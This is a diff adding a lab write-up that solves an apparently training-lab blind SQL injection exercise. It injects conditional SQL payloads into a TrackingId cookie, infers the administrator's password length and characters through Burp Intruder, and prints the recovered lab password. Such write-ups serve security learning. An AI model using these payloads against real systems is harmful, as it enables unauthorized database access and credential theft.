@@ -1,0 +1,101 @@
+#+title: Blind SQL injection with conditional responses
+#+author: [[https://github.com/touhidulshawan][Touhidul Shawan]]
+
+* Table of Contents :toc:
+- [[#lab-contain][Lab Contain]]
+- [[#goal][Goal]]
+- [[#find-out-the-features][Find out the Features]]
+- [[#verify-welcome-back-behaviour-based-on-injected-query-on-trackingid-to-confirm-blind-sql-injection-vulnerability][Verify "Welcome Back!" behaviour based on injected query on ~TrackingId~ to confirm blind SQL injection vulnerability]]
+- [[#verify-that-there-is-a-table-called-users][Verify that there is a table called ~users~]]
+- [[#verify-that-there-is-a-user-called-administrator][Verify that there is a user called ~administrator~]]
+- [[#determine-how-many-characters-are-in-the-password-of-the-administrator][Determine how many characters are in the password of the ~administrator~]]
+- [[#test-the-character-at-each-position-to-determine-the-password][Test the character at each position to determine the password]]
+- [[#solve-the-lab][Solve the Lab]]
+
+* Lab Contain
++ Blind SQL injection vulnerability
++ Use TrackingID in cookie for analytics
++ Show *"Welcome Back!"* message on successful query
++ DB contains table ~users~ with columns ~username~ and ~password~
+* Goal
++ Exploit the blind SQL injection vulnerability and gain Password for ~administrator~
++ Login as ~administrator~
+
+* Find out the Features
+/Find the features of the application that might be vulnerable to blind SQL injection/
+
+Since this application use ~trackingID~. It can be the point. Based on the ~trackingID~ application shows message "Welcome Back!" on the web page. If the ~trackingID~ exist on DB then it shows the message else not.
+
+Now we can systematically determine the password for ~administrator~ by sending series of inputs to test the password one character at a time. We can send query like this
+#+begin_src sql
+  AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) > 'm
+#+end_src
+
+If this returns the message, then the injected condition is true and so the first character of the password is greater than m
+
+* DONE Verify "Welcome Back!" behaviour based on injected query on ~TrackingId~ to confirm blind SQL injection vulnerability
+CLOSED: [2023-07-31 Mon 14:55]
+Application use like this query to check the trackingId. If it matches then it shows *Welcome Back!* message on the application.
+#+begin_src sql
+  SELECT trackingId FROM tracking.table WHERE trackingId = 'T9IjXtGqVbhsOlr3'
+#+end_src
+
+Now we can manipulate this query with conditional clause to verify the blind SQL injection
+
+#+begin_src sql
+  SELECT trackingId FROM tracking.table WHERE trackingId = 'T9IjXtGqVbhsOlr3' AND 1 = 1 --'
+#+end_src
+/condition true show *Welcome back!* message/
+
+#+begin_src sql
+  SELECT trackingId FROM tracking.table WHERE trackingId = 'T9IjXtGqVbhsOlr3' AND 1 = 0 --'
+#+end_src
+/condition false does not show *Welcome back!* message/
+
+* DONE Verify that there is a table called ~users~
+CLOSED: [2023-07-31 Mon 14:55]
+#+begin_src sql
+  SELECT trackingId FROM tracking.table WHERE trackingId = 'T9IjXtGqVbhsOlr3' AND (SELECT 'a' FROM users LIMIT 1) = 'a
+#+end_src
+return that message means ~users~ table exist in DB
+
+* DONE Verify that there is a user called ~administrator~
+CLOSED: [2023-07-31 Mon 14:55]
+#+begin_src sql
+  SELECT trackingId FROM tracking.table WHERE trackingId = 'T9IjXtGqVbhsOlr3' AND (SELECT username FROM users WHERE username='administrator')='administrator'--'
+#+end_src
+/return true that means there is users called administrator on the users table/
+
+* DONE Determine how many characters are in the password of the ~administrator~
+CLOSED: [2023-07-31 Mon 15:07]
+To find out the length of the password for administrator user we can send this query
+#+begin_src sql
+  SELECT trackingId FROM tracking.table WHERE trackingId = 'T9IjXtGqVbhsOlr3' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>1)='administrator'--' 
+#+end_src
+/If the password length greater that 1 then it should send the Welcome back! message. If  not then no message will come. We can increase the number sequentially until do not get the message/
+
+We can use the burpsuite intruder to automate this task.
+
+[[./assets/screenshots/lab11-intruder.png]]
+/Here we can see that from 1 to 19 the injected query return true. so that wecome back message returns. But after that query return false, so no message returns on application/
+*So the lenght of the password is 20*
+* DONE Test the character at each position to determine the password 
+CLOSED: [2023-07-31 Mon 16:04]
+#+begin_src sql
+  SELECT trackingId FROM tracking.table WHERE trackingId = 'T9IjXtGqVbhsOlr3' AND (SELECT SUBSTRING(password, 1,1) FROM users WHERE username='administrator')='a'--' 
+#+end_src
++ /check if the first character of password of administrator user is 'a'/
++ if first character of password is a then move to second position of password. We have to continue this process until 20 character. That's the length of password.
++ we can change the character position and letters until we find out the password
+
+| Position  | 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 | 9 | 10 | 11 | 12 | 13 | 14 | 15 | 16 | 17 | 18 | 19 | 20 |
+|-----------+---+---+---+---+---+---+---+---+---+----+----+----+----+----+----+----+----+----+----+----|
+| Character | l | q | y | 7 | d | d | g | o | v |  j |  t |  d |  w |  2 |  1 |  1 |  b |  3 |  1 |  s |
+
++ So the password for administrator is ~lqy7ddgovjtdw211b31s~
+
+* DONE Solve the Lab
+CLOSED: [2023-07-31 Mon 16:05]
+Now login into the system with credential to solve the lab
+- username: ~administrator~
+- password: ~lqy7ddgovjtdw211b31s~
